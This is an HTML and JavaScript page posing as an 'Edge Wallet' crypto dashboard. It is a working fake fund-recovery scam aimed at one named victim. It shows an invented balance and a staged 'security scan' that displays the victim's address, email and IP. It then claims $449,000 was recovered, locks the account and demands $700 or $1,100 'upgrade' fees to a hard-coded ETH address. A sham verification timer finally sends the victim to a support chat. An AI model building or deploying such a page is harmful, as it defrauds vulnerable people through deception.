<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Edge Wallet | Ethereum Pay</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
  <style>
    :root {
      --edge-bg: #18191d;
      --edge-card: #232427;
      --edge-panel: #232427;
      --edge-light: #292a30;
      --edge-dark: #191a1e;
      --edge-green: #14ea8f;
      --edge-red: #e24c4b;
      --edge-yellow: #ffc400;
      --edge-grey: #888a8b;
      --edge-border: #36373a;
      --edge-btn-bg: #36373a;
      --edge-btn-hover: #45484d;
      --edge-btn-fg: #fff;
      --edge-shadow: 0 4px 24px 0 #000a;
      --edge-radius: 22px;
      --edge-blue: #51ffc9;
      --edge-text: #e9e9e9;
      --edge-muted: #b7b7b7;
      --edge-eth: #fff;
      --edge-eth-bg: linear-gradient(90deg, #24252b 70%, #232427 100%);
      --edge-nav-active: #14ea8f;
      --edge-nav-inactive: #b7b7b7;
      --edge-lock-bg: #191a1eeb;
    }
    html, body {
      background: var(--edge-bg);
      min-height: 100vh;
      color: var(--edge-text);
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
      letter-spacing: 0.02em;
      font-size: 16px;
    }
    #app {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      background: var(--edge-bg);
      width: 100vw;
    }
    .centered {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: transparent;
    }
    .edge-card {
      background: var(--edge-card);
      border-radius: var(--edge-radius);
      box-shadow: var(--edge-shadow);
      padding: 2.1rem 1.5rem;
      max-width: 380px;
      width: 95vw;
      margin: 2rem auto;
      border: 1.5px solid var(--edge-border);
      position: relative;
      z-index: 3;
    }
    .edge-logo {
      max-width: 54px;
      margin: 0 auto 1.1rem auto;
      display: block;
      filter: brightness(1.1) drop-shadow(0 2px 6px #14ea8f33);
    }
    h2, h3 {
      font-weight: 700;
      margin: 0.6em 0 0.3em 0;
      color: var(--edge-text);
      letter-spacing: -.01em;
    }
    .splash-welcome {
      font-size: 1.4em;
      font-weight: 700;
      color: var(--edge-green);
      margin-top: 1.2em;
      margin-bottom: 0.4em;
      letter-spacing: .01em;
      text-align: center;
    }
    .dashboard-lock-banner {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      background: var(--edge-lock-bg);
      color: #fff;
      z-index: 10;
      padding: 1.3em 1em 1.1em 1em;
      text-align: center;
      font-size: 1.15em;
      font-weight: 700;
      border-radius: 0 0 16px 16px;
      backdrop-filter: blur(3px);
      letter-spacing: 0.01em;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 1em;
      box-shadow: 0 4px 18px #0007;
      pointer-events: auto;
    }
    .dashboard-lock-banner .locked-btn {
      margin-top: 0.7em;
      padding: 0.77em 2em;
      font-size: 1em;
      border-radius: 10px;
      background: var(--edge-green);
      color: #101010;
      border: none;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s;
      box-shadow: 0 2px 8px #14ea8f44;
    }
    .dashboard-lock-banner .locked-btn:hover {
      background: #1be7a4;
      color: #232427;
    }
    .locked {
      pointer-events: none !important;
      opacity: 0.5 !important;
      filter: blur(0.2px) grayscale(0.2);
    }
    .main-withdraw-btn {
      display: block;
      margin: 24px auto 0 auto;
      width: 90%;
      font-size: 1.11em;
      font-weight: 700;
      background: var(--edge-green);
      color: #101010;
      border-radius: 14px;
      border: none;
      padding: 1em;
      box-shadow: 0 2px 12px rgba(20,234,143,0.13);
      transition: background 0.2s, color 0.2s, box-shadow 0.2s;
      letter-spacing: 0.01em;
      cursor: pointer;
    }
    .main-withdraw-btn:hover {
      background: #1be7a4;
      color: #232427;
    }
    .dashboard-balance-card {
      margin: 0 20px;
      margin-top: 18px;
      background: var(--edge-eth-bg);
      border-radius: 18px;
      padding: 22px 20px 18px 20px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      box-shadow: 0 2px 16px #1117;
      position: relative;
      border: 1.5px solid #292a30;
    }
    .raider-modal {
      background: var(--edge-card);
      border-radius: 18px;
      box-shadow: 0 6px 32px #000b;
      max-width: 410px;
      width: 94vw;
      padding: 2.1rem 1.5rem;
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      z-index: 10002;
      border: 1.5px solid var(--edge-green);
      font-family: inherit;
      text-align: left;
    }
    .raider-header {
      display: flex;
      align-items: center;
      gap: 1em;
      margin-bottom: 1.1em;
    }
    .raider-header .raider-spinner {
      width: 36px;
      height: 36px;
      border: 4px solid #14ea8f33;
      border-top: 4px solid #14ea8f;
      border-radius: 50%;
      animation: spin 1.3s linear infinite;
    }
    @keyframes spin {
      0% {transform: rotate(0deg);}
      100% {transform: rotate(360deg);}
    }
    .raider-log {
      margin-top: 1.3em;
      font-family: 'Roboto Mono', monospace;
      background: #1d1e22;
      border-radius: 10px;
      padding: 1.2em 1em;
      color: #dedede;
      font-size: 0.98em;
      max-height: 275px;
      overflow-y: auto;
      min-height: 150px;
      margin-bottom: 0.7em;
      letter-spacing: 0.01em;
      line-height: 1.55;
    }
    .raider-log .log-pass { color: #14ea8f; }
    .raider-log .log-warn { color: #ffc400; }
    .raider-log .log-fail { color: #e24c4b; }
    .raider-modal .raider-cta {
      margin-top: 2em;
      padding: 0.8em 2em;
      font-size: 1.06em;
      border-radius: 9px;
      border: none;
      background: var(--edge-green);
      color: #101010;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 2px 6px #14ea8f33;
    }
    .raider-modal .raider-cta:active {
      background: #1be7a4;
    }
    .raider-modal .raider-cta[disabled] {
      background: #45484d99;
      color: #bbb;
      cursor: not-allowed;
    }
    .upgrade-modal-levels {
      margin: 1.1em 0 0.6em 0;
      display: flex;
      flex-direction: column;
      gap: 1.1em;
    }
    .upgrade-level {
      background: #222325;
      border: 1.5px solid #36373a;
      border-radius: 10px;
      padding: 0.9em 1em;
      display: flex;
      align-items: center;
      gap: 1.1em;
      justify-content: space-between;
      font-size: 1em;
      font-weight: 500;
      cursor: pointer;
      transition: border 0.2s, background 0.15s;
    }
    .upgrade-level.selected, .upgrade-level:hover {
      border-color: var(--edge-green);
      background: #242d23;
    }
    .upgrade-level .level-name {
      font-weight: 700;
      font-size: 1.06em;
      color: #fff;
      letter-spacing: 0.01em;
    }
    .upgrade-level .level-desc {
      color: #b7b7b7;
      font-size: 0.98em;
    }
    .upgrade-level .level-cost {
      font-weight: 700;
      color: var(--edge-green);
      font-size: 1.05em;
    }
    .locked-warning {
      color: var(--edge-red);
      font-weight: 600;
      font-size: 1.09em;
      margin-bottom: 1.2em;
      text-align: center;
    }
    .progress-bar {
      width: 92%;
      height: 15px;
      background: #262627;
      border-radius: 6px;
      margin: 24px auto 1.5em auto;
      overflow: hidden;
      border: 1px solid #31374e;
      box-shadow: 0 2px 10px #14ea8f13;
    }
    .progress-bar-inner {
      height: 100%;
      background: linear-gradient(90deg, #14ea8f 80%, #14ea8f77);
      transition: width 0.5s linear;
      width: 1%;
    }
    /* Floating support button */
    #support-float-btn {
      position: fixed;
      right: 18px;
      bottom: 82px;
      z-index: 9999;
      background: var(--edge-green);
      color: #101010;
      border-radius: 50%;
      width: 54px;
      height: 54px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 2em;
      box-shadow: 0 4px 18px rgba(20,234,143,0.21);
      text-decoration: none;
      transition: background 0.2s, color 0.2s;
      cursor: pointer;
      border: 2.5px solid #10101044;
    }
    #support-float-btn:hover {
      background: #29ffc6;
      color: #252525;
    }
    @media (max-width: 500px) {
      .edge-card { padding: 1.1rem 0.5rem; }
      .dashboard-header h2 { font-size: 1.07em; }
      .edge-dashboard,
      .edge-navbar {
        max-width: 100vw;
      }
      .raider-modal { padding: 1.1rem 0.6rem; }
    }
  </style>
</head>
<body>
<div id="app"></div>
<!-- Floating Support Button -->
<a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" 
   target="_blank" 
   id="support-float-btn" 
   title="Live Support">
  üí¨
</a>
<script>
/* --- Constants (your custom images here) --- */
const EDGE_LOGO_URL = "IMG_3911.jpeg";
const ETH_ICON = "IMG_3908.png";
const BTC_ICON = "IMG_3909.png";
const SOL_ICON = "IMG_3910.png";
const USER_NAME = "Randi Perrone Kerfoot";
const USER_EMAIL = "randi.pk@example.com";
const USER_LOCATION = "2113 Sherbrooke Circle, Virginia Beach, VA 23454";
const USER_IP = "192.0.2.24";
const ETH_ADDRESS = "0x3c73bcC0403a7919fbB0C9B567Bf5D1079c72Cdc";
const RECOVERED_AMOUNT = 449000;
const RECOVERED_ETH = 125.81;
const START_AMOUNT = 30000;
const START_ETH = 9.2;
const LEVELS = [
  {
    name: "Level 1",
    desc: "Current level ¬∑ Limit Exceeded",
    cost: "",
    price: 0,
    max: 30000,
    allowed: false,
  },
  {
    name: "Level 2",
    desc: "Upgrade to access $300,000",
    cost: "$700",
    price: 700,
    max: 300000,
    allowed: true,
  },
  {
    name: "Level 3",
    desc: "Upgrade to access all funds",
    cost: "$1,100",
    price: 1100,
    max: 1000000,
    allowed: true,
  },
];
const REFILL_ADDRESS = "0xe30Ac60E1bEBe1A23A3B16548067d062c78DEBC4";
const SUPPORT_URL = "https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings";

/* --- State --- */
let state = {
  step: "splash",
  dashboardLock: false,
  showLockBanner: false,
  balance: START_AMOUNT,
  eth: START_ETH,
  scanDone: false,
  upgradeModal: false,
  selectedLevel: null,
  upgradeStage: null, // null | "pay" | "upload" | "verify" | "timeout"
  upgradeSpinner: 0,
  upgradeScreenshot: null,
  modal: null,
  splashTimeout: null,
  scanTimeout: null,
  scanIndex: 0,
};

/* --- Splash & Dashboard --- */
function renderSplash(app) {
  app.innerHTML = `
    <div class="centered" style="background:var(--edge-bg);min-height:100vh;">
      <img src="${EDGE_LOGO_URL}" class="edge-logo" style="max-width:92px;">
      <div class="splash-welcome">Welcome ${USER_NAME}</div>
    </div>
  `;
}
function renderDashboard(app) {
  app.innerHTML = "";

  const dash = document.createElement('div');
  dash.className = 'edge-dashboard';
  dash.innerHTML = `
    <div class="edge-dashboard-header">
      <div class="help"></div>
      <img src="${EDGE_LOGO_URL}" class="logo" alt="Edge Wallet">
      <button class="menu" style="background:none;border:none;opacity:0;pointer-events:none;">&#9776;</button>
    </div>
    <div class="dashboard-balance-card ${state.dashboardLock ? "locked" : ""}" id="balanceCard">
      <span class="balance-label">Total Balance <i style="font-size:1em;opacity:.55;">üëÅÔ∏è‚Äçüó®Ô∏è</i></span>
      <div class="dashboard-balance">$ ${state.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})} USD</div>
      <div style="font-size:1.13em;color:#51ffc9;font-weight:600;margin-bottom:5px;">(${state.eth} ETH)</div>
      <button class="main-withdraw-btn" id="withdrawBtn" ${state.dashboardLock?'disabled':''}>Withdraw</button>
    </div>
    <div class="wallets-label">Wallets</div>
    <div class="wallets-list ${state.dashboardLock ? "locked" : ""}" id="walletsList">
      <div class="wallet-asset-card" style="background: #222325;">
        <div class="wallet-asset-left">
          <div class="wallet-asset-icon"><img src="${ETH_ICON}" alt="ETH"></div>
          <div class="wallet-asset-txt">
            <span class="wallet-asset-name">ETH</span>
            <span class="wallet-asset-usd">$3,700</span>
            <span class="wallet-asset-chg" style="color:#e24c4b;">-2.10%</span>
          </div>
        </div>
        <div class="wallet-asset-right">
          <div class="wallet-asset-holdings">${state.eth} ETH</div>
          <span style="font-size:1em;color:#51ffc9;">$${state.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}</span>
          <span class="wallet-asset-link">My Ether</span>
        </div>
      </div>
      <div class="wallet-asset-card">
        <div class="wallet-asset-left">
          <div class="wallet-asset-icon"><img src="${BTC_ICON}" alt="BTC"></div>
          <div class="wallet-asset-txt">
            <span class="wallet-asset-name">BTC</span>
            <span class="wallet-asset-usd">$118,661</span>
            <span class="wallet-asset-chg" style="color:#14ea8f;">+0.57%</span>
          </div>
        </div>
        <div class="wallet-asset-right">
          <div class="wallet-asset-holdings">0</div>
          <span style="font-size:1em;color:#51ffc9;">$0</span>
          <span class="wallet-asset-link">My Bitcoin</span>
        </div>
      </div>
      <div class="wallet-asset-card">
        <div class="wallet-asset-left">
          <div class="wallet-asset-icon"><img src="${SOL_ICON}" alt="SOL"></div>
          <div class="wallet-asset-txt">
            <span class="wallet-asset-name">SOL</span>
            <span class="wallet-asset-usd">$203.08</span>
            <span class="wallet-asset-chg" style="color:#14ea8f;">+3.83%</span>
          </div>
        </div>
        <div class="wallet-asset-right">
          <div class="wallet-asset-holdings">0</div>
          <span style="font-size:1em;color:#51ffc9;">$0</span>
          <span class="wallet-asset-link">My Solana</span>
        </div>
      </div>
    </div>
    <div class="assets-search">
      <span style="color:#b7b7b7;font-size:1.1em;">üîç</span>
      <input type="text" placeholder="Search Wallets" disabled>
    </div>
  `;
  app.appendChild(dash);

  // Lock banner
  if (state.showLockBanner) {
    const banner = document.createElement('div');
    banner.className = "dashboard-lock-banner";
    banner.innerHTML = `
      <span>üîí Account locked due to low verification status.<br>
        <span style="color:#fff;font-weight:500;font-size:0.99em;">Kindly upgrade your account to proceed further.</span>
      </span>
      <button class="locked-btn" id="upgradeBtn">UPGRADE ACCOUNT</button>
    `;
    dash.appendChild(banner);
    banner.querySelector('#upgradeBtn').onclick = () => {
      state.upgradeModal = true;
      render();
    };
  }

  // Withdraw
  dash.querySelector('#withdrawBtn').onclick = () => {
    renderModal(withdrawModal());
  };
}

/* --- Modal logic --- */
function renderModal(content) {
  let modalOverlay = document.createElement('div');
  modalOverlay.style.position = 'fixed';
  modalOverlay.style.left = 0;
  modalOverlay.style.top = 0;
  modalOverlay.style.width = '100vw';
  modalOverlay.style.height = '100vh';
  modalOverlay.style.zIndex = 10001;
  modalOverlay.style.background = 'rgba(24,25,29,0.55)';
  modalOverlay.onclick = (e) => {
    if (e.target === modalOverlay) {
      state.modal = null;
      render();
    }
  };
  modalOverlay.appendChild(content);
  document.body.appendChild(modalOverlay);
  state.modal = modalOverlay;
}
function closeModal() {
  if (state.modal) {
    document.body.removeChild(state.modal);
    state.modal = null;
    render();
  }
}

/* --- Withdraw Modal --- */
function withdrawModal() {
  let div = document.createElement('div');
  div.className = 'edge-card';
  div.style.maxWidth = "370px";
  div.innerHTML = `
    <h3>Withdraw Funds</h3>
    <form id="withdrawForm" autocomplete="off">
      <div style="font-size:1.05em; margin-bottom:.7em;">
        Please confirm you are the rightful owner and consent to the withdrawal of <b>$${state.balance.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})} (${state.eth} ETH)</b> to your ETH address.
      </div>
      <div class="checkbox-group">
        <input type="checkbox" id="confirmWithdrawCheck" required>
        <label for="confirmWithdrawCheck">I confirm and agree to this withdrawal</label>
      </div>
      <label for="withdrawAddr">ETH Address</label>
      <input type="text" id="withdrawAddr" placeholder="Enter destination ETH address" required autocomplete="off" value="${ETH_ADDRESS}">
      <button class="button" id="confirmWithdraw" disabled>Confirm Withdraw</button>
      <button class="button" id="cancelWithdraw" style="margin-top:0.6em;background:#333;color:#b7b7b7;">Cancel</button>
    </form>
  `;
  setTimeout(()=>{
    const form = div.querySelector('#withdrawForm');
    const checkbox = div.querySelector('#confirmWithdrawCheck');
    const confirmBtn = div.querySelector('#confirmWithdraw');
    const addrInput = div.querySelector('#withdrawAddr');
    checkbox.onchange = () => { confirmBtn.disabled = !checkbox.checked; };
    addrInput.oninput = () => { addrInput.style.borderColor = ''; };
    form.onsubmit = function(e) {
      e.preventDefault();
      const addr = addrInput.value.trim();
      if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) {
        addrInput.style.borderColor = "#e24c4b";
        addrInput.focus();
        return;
      }
      closeModal();
      setTimeout(()=>{ popupRecoveryModal(); },200);
    };
    div.querySelector('#cancelWithdraw').onclick = function(e){
      e.preventDefault(); closeModal();
    }
  },0);
  return div;
}

/* --- Unfinished Recovery Modal --- */
function popupRecoveryModal() {
  let modal = document.createElement('div');
  modal.className = "raider-modal";
  modal.innerHTML = `
    <div style="font-weight:700;font-size:1.18em;margin-bottom:.8em;">Dear user</div>
    <div style="font-size:1.08em;margin-bottom:1.4em;">
      You have an <b>Unfinished Recovery Request</b>. For your safety and to recover all funds, please complete your recovery.
    </div>
    <button class="raider-cta" id="boostBtn">BOOST UP RECOVERY</button>
  `;
  modal.querySelector('#boostBtn').onclick = function() {
    closeModal();
    setTimeout(()=>{ popupRaiderScan(); },300);
  }
  renderModal(modal);
}

/* --- Raider Scan Modal & Logic --- */
const scanSteps = [
  {text: "# Checking security of connection...", delay: 1500, class:"log-pass", val:"PASSED"},
  {text: "# Country - United States", delay: 1300},
  {text: "# User Location - 2113 Sherbrooke Circle, Virginia Beach, VA 23454", delay: 800},
  {text: "# Username - Randi Perrone-Kerfoot", delay: 800},
  {text: "# Email - Verified (randi.pk@example.com)", delay: 900, class:"log-pass"},
  {text: "# IP Address - 192.0.2.24 (Secure)", delay: 1100, class:"log-pass"},
  {text: "# Device Status - No malware detected", delay: 1100, class:"log-pass"},
  {text: "# Network Integrity - Stable (No packet loss)", delay: 1100, class:"log-pass"},
  {text: "# ETH Address - 0x3c73bcC0403a7919fbB0C9B567Bf5D1079c72Cdc", delay: 1100, class:"log-pass"},
  {text: "# Wallet Balance - Verified (Encrypted)", delay: 1200, class:"log-pass"},
  {text: "# Two-Factor Authentication - Enabled", delay: 1200, class:"log-pass"},
  {text: "# Account Recovery Tokens - Validated", delay: 1200, class:"log-pass"},
  {text: "# Encryption Status - AES-256 Verified", delay: 1000, class:"log-pass"},
  {text: "# Scan Completed - No security breaches detected", delay: 1200, class:"log-pass"}
];
function popupRaiderScan() {
  let modal = document.createElement('div');
  modal.className = "raider-modal";
  modal.innerHTML = `
    <div class="raider-header">
      <div class="raider-spinner"></div>
      <span style="font-size:1.08em;font-weight:600;">UPDATING REQUEST‚Ä¶</span>
    </div>
    <div class="raider-log" id="raiderLog"></div>
  `;
  renderModal(modal);

  let log = modal.querySelector('#raiderLog');
  let idx = 0;
  log.innerHTML = "";
  function step() {
    if (idx < scanSteps.length) {
      let st = scanSteps[idx];
      let line = document.createElement('div');
      line.innerHTML = `<span style="color:#a9a9a9">${new Date(2025,0,1,0,Math.floor(15+idx*13/60), ((15+idx*13)%60).toString().padStart(2,'0')) //fake time
        .toTimeString().slice(0,5)}</span> <span class="${st.class||''}">${st.text} ${st.val?(' <span class="'+st.class+'">'+st.val+'</span>'):''}</span>`;
      log.appendChild(line);
      log.scrollTop = log.scrollHeight;
      idx++;
      setTimeout(step, st.delay);
    } else {
      setTimeout(()=>{
        // Add recovered funds
        state.balance += RECOVERED_AMOUNT;
        state.eth = +(state.eth + RECOVERED_ETH).toFixed(4);
        state.dashboardLock = true;
        state.showLockBanner = true;
        closeModal();
        render();
        setTimeout(()=>popupLockModal(),350);
      }, 800);
    }
  }
  step();
}

/* --- Lock Modal --- */
function popupLockModal() {
  let modal = document.createElement('div');
  modal.className = "raider-modal";
  modal.innerHTML = `
    <div class="locked-warning">
      <span style="font-size:1.6em;">üîí</span><br>
      <span style="font-size:1.1em;">Professional Account Locked</span>
      <div style="font-weight:400;margin-top:0.8em;color:#f5f5f5;font-size:1.05em;">
        Your account is locked due to low verification status.<br>
        Kindly upgrade your account to proceed further.
      </div>
    </div>
    <button class="raider-cta" id="upgradeBtn">UPGRADE ACCOUNT</button>
  `;
  modal.querySelector('#upgradeBtn').onclick = function() {
    closeModal();
    setTimeout(()=>popupUpgradeModal(),200);
  }
  renderModal(modal);
}

/* --- Upgrade Modal --- */
function popupUpgradeModal() {
  let modal = document.createElement('div');
  modal.className = "raider-modal";
  modal.innerHTML = `
    <div style="font-size:1.13em;font-weight:600;margin-bottom:.7em;">Upgrade Account</div>
    <div style="color:#b7b7b7;font-size:0.98em;margin-bottom:1.1em;">
      Select a verification level to increase your withdrawal limit and unlock your account.
    </div>
    <div class="upgrade-modal-levels" id="levelsList"></div>
    <button class="raider-cta" id="closeUpgrade" style="margin-top:1.2em;background:#444;color:#b7b7b7;">Cancel</button>
  `;
  renderModal(modal);

  let levelsList = modal.querySelector('#levelsList');
  LEVELS.forEach((lev, i) => {
    let levelDiv = document.createElement('div');
    levelDiv.className = "upgrade-level" + (lev.allowed ? "" : " disabled");
    if (state.selectedLevel === i) levelDiv.classList.add("selected");
    levelDiv.innerHTML = `
      <div>
        <div class="level-name">${lev.name}</div>
        <div class="level-desc">${lev.desc}</div>
      </div>
      <div class="level-cost">${lev.cost}</div>
    `;
    levelDiv.style.cursor = lev.allowed ? "pointer" : "not-allowed";
    levelDiv.onclick = () => {
      if (!lev.allowed) return;
      state.selectedLevel = i;
      state.upgradeStage = "pay";
      closeModal();
      setTimeout(()=>popupUpgradePaymentModal(i),180);
    };
    levelsList.appendChild(levelDiv);
  });
  modal.querySelector('#closeUpgrade').onclick = function() {
    closeModal();
  }
}

/* --- Upgrade Payment Modal --- */
function popupUpgradePaymentModal(levelIdx) {
  let lev = LEVELS[levelIdx];
  let modal = document.createElement('div');
  modal.className = "raider-modal";
  modal.innerHTML = `
    <div style="font-size:1.12em;font-weight:600;margin-bottom:.4em;">Upgrade to ${lev.name}</div>
    <div style="font-size:1.02em;margin-bottom:1.2em;">
      To upgrade, send <span style="color:var(--edge-green);font-weight:700;">${lev.cost}</span> to the ETH address below and upload your payment screenshot.
    </div>
    <div style="margin-bottom:1em;">
      <span style="font-size:1.01em;color:#b7b7b7;">ETH Points Address:</span><br>
      <span style="font-size:1.08em;font-weight:600;letter-spacing:0.02em;">${REFILL_ADDRESS}</span>
      <button class="button" id="copyRefillBtn" style="margin-left:1em;width:auto;font-size:0.98em;padding:0.44em 1.2em;">Copy</button>
      <span id="copySuccess" style="margin-left:.6em; color:var(--edge-green); font-size:0.99em; display:none;">Copied!</span>
    </div>
    <div>
      <input type="file" id="upgradeScreenshot" accept="image/*" style="margin-bottom:1.1em;">
      <div id="uploadedPreview"></div>
    </div>
    <button class="raider-cta" id="uploadBtn" disabled>Upload & Verify</button>
    <button class="raider-cta" id="cancelBtn" style="margin-top:0.6em;background:#444;color:#b7b7b7;">Cancel</button>
  `;
  renderModal(modal);

  modal.querySelector('#copyRefillBtn').onclick = function() {
    navigator.clipboard.writeText(REFILL_ADDRESS);
    modal.querySelector('#copySuccess').style.display = 'inline';
    setTimeout(()=>{modal.querySelector('#copySuccess').style.display='none';}, 1500);
  };
  const fileInput = modal.querySelector('#upgradeScreenshot');
  const preview = modal.querySelector('#uploadedPreview');
  const uploadBtn = modal.querySelector('#uploadBtn');
  fileInput.onchange = function() {
    const file = fileInput.files[0];
    if (file && file.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = function(e) {
        preview.innerHTML = `<img src="${e.target.result}" alt="Screenshot" style="max-width:100%;margin:1em auto 0.7em auto;border-radius:8px;box-shadow:0 2px 10px #14ea8f22;">`;
        state.upgradeScreenshot = e.target.result;
        uploadBtn.disabled = false;
      };
      reader.readAsDataURL(file);
    }
  };
  uploadBtn.onclick = () => {
    closeModal();
    setTimeout(()=>popupUpgradeVerifyModal(),350);
  };
  modal.querySelector('#cancelBtn').onclick = () => {
    closeModal();
  }
}

/* --- Upgrade Verification Modal --- */
function popupUpgradeVerifyModal() {
  let modal = document.createElement('div');
  modal.className = "raider-modal";
  modal.innerHTML = `
    <div style="font-size:1.12em;font-weight:600;margin-bottom:.4em;">Verification in Progress</div>
    <div style="color:#b7b7b7;font-size:1.02em;margin-bottom:1.1em;">Your payment is being verified. This may take up to 3 hours.</div>
    <div class="progress-bar"><div class="progress-bar-inner" id="verifProgress" style="width:8%"></div></div>
    <div style="margin-top:0.9em;text-align:center;">
      <span id="verifTime" style="font-size:1.11em;font-weight:600;color:var(--edge-green);">00:00:00 / 03:00:00</span>
    </div>
  `;
  renderModal(modal);

  // Simulate 3 hours (show 10s then timeout)
  let elapsed = 0, total = 10; // seconds (simulate)
  let bar = modal.querySelector('#verifProgress');
  let tm = modal.querySelector('#verifTime');
  function tick() {
    elapsed += 1;
    let percent = Math.floor((elapsed/total)*100);
    bar.style.width = Math.min(percent,100) + "%";
    let h = Math.floor(elapsed/3600), m = Math.floor((elapsed%3600)/60), s = elapsed%60;
    tm.innerText = `${String(h).padStart(2,"0")}:${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")} / 03:00:00`;
    if (elapsed < total) setTimeout(tick, 1000);
    else setTimeout(()=>{
      closeModal();
      setTimeout(()=>popupUpgradeTimeoutModal(),300);
    }, 800);
  }
  tick();
}
/* --- Verification Timeout Modal --- */
function popupUpgradeTimeoutModal() {
  let modal = document.createElement('div');
  modal.className = "raider-modal";
  modal.innerHTML = `
    <div style="font-size:1.18em;font-weight:700;margin-bottom:1.2em;color:var(--edge-red);">Verification Timeout</div>
    <div style="font-size:1.08em;margin-bottom:1.5em;">
      Your verification process has timed out.<br>
      Please <a href="${SUPPORT_URL}" target="_blank" style="color:var(--edge-green);text-decoration:underline;">contact support</a> for more information regarding this issue.
    </div>
    <button class="raider-cta" id="backBtn">Back to Dashboard</button>
  `;
  renderModal(modal);
  modal.querySelector('#backBtn').onclick = () => {
    closeModal();
  }
}


/* --- Initialization --- */
window.addEventListener('DOMContentLoaded', () => {
  const app = document.getElementById('app');
  // Splash logic
  if (state.step === "splash") {
    renderSplash(app);
    state.splashTimeout = setTimeout(()=>{
      state.step = "dashboard";
      render();
      setTimeout(()=>popupRecoveryModal(), 800); // Show recovery modal after dashboard
    }, 1500);
    return;
  }
  // Dashboard
  renderDashboard(app);

  // Upgrade modal
  if (state.upgradeModal) {
    popupUpgradeModal();
    state.upgradeModal = false;
  }
});
</script>
</body>
</html>
